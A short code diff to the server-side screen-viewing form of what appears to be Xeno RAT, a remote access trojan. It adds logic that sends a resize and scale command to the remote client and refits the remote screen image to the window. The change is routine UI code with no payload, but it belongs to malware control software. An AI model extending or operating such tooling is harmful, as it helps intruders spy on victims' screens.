@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
+using System.Diagnostics;
 using System.Drawing;
 using System.IO;
 using System.Linq;
@@ -9,6 +10,7 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using static System.Net.Mime.MediaTypeNames;
 
 namespace xeno_rat_server.Forms
 {
@@ -93,6 +95,7 @@ namespace xeno_rat_server.Forms
             await client.SendAsync(new byte[] { 3 });
             await client.SendAsync(client.sock.IntToBytes(quality));
         }
+
         public async Task SetMonitor(int monitorIndex)
         {
             monitor_index = monitorIndex;
@@ -101,7 +104,26 @@ namespace xeno_rat_server.Forms
             int Width = client.sock.BytesToInt(await client.ReceiveAsync());
             int Height = client.sock.BytesToInt(await client.ReceiveAsync());
             current_mon_size = new Size(Width, Height);
+            UpdateScaleSize();
         }
+
+        public async Task UpdateScaleSize() 
+        {
+            if (pictureBox1.Width > ((Size)current_mon_size).Width || pictureBox1.Height > ((Size)current_mon_size).Height)
+            {
+                await client.SendAsync(new byte[] { 13 });
+                await client.SendAsync(client.sock.IntToBytes(100));
+            }
+            else
+            {
+                double widthRatio = (double)pictureBox1.Width/ (double)((Size)current_mon_size).Width ;
+                double heightRatio = (double)pictureBox1.Height / (double)((Size)current_mon_size).Height;
+                int factor = (int)(Math.Max(widthRatio, heightRatio)*10000.0);
+                await client.SendAsync(new byte[] { 13 });
+                await client.SendAsync(client.sock.IntToBytes(factor));
+            }
+        }
+
         public async Task RecvThread() 
         {
             while (ImageNode.Connected()) 
@@ -116,10 +138,10 @@ namespace xeno_rat_server.Forms
                     try
                     {
 
-                        Image image;
+                        System.Drawing.Image image;
                         using (MemoryStream ms = new MemoryStream(data))
                         {
-                            image = Image.FromStream(ms);
+                            image = System.Drawing.Image.FromStream(ms);
                         }
                         pictureBox1.BeginInvoke(new Action(() =>
                         {
@@ -391,6 +413,11 @@ namespace xeno_rat_server.Forms
             {
                 checkBox1.Text = "Disabled";
             }
+        }
+
+        private void pictureBox1_SizeChanged(object sender, EventArgs e)
+        {
+            UpdateScaleSize();
         }
     }
 }
